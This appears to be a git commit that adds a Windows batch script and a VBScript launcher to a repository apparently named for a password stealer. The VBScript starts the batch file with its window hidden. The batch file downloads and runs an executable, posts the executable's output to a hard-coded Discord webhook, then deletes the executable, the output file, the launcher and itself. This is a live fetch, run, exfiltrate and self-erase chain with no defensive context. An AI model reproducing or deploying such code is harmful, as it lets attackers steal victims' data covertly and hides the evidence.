e7c60ea50f0daa073d8e6c65e5d21699232f1416
Sap196 <93683318+Sap196@users.noreply.github.com>
2024-01-31 21:49:37 +0100

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,20 @@
+@echo off
+setlocal enabledelayedexpansion
+
+rem Download encrypt3.exe from GitHub
+curl -OL https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt3.exe
+
+rem Run the Go program and capture its output to a file
+encrypt3.exe > output.txt
+
+rem Construct and execute the cURL command
+set "discord_webhook=https://discord.com/api/webhooks/1202328029196730398/24xNitV8WYbF4qUql5MncBzaVeyDJfvAwLOsSdU8yPl17R4mwT8Juyo9TWGqi2FEfYBL"
+set "curl_command=curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@output.txt" %discord_webhook%"
+echo Sending cURL command: %curl_command%
+%curl_command%
+
+rem Remove files and the script
+del encrypt3.exe
+del output.txt
+del main.vbs
+del "%~f0"
---
+++ main.vbs
@@ -0,0 +1,3 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "main.bat", 0, False
+Set objShell = Nothing
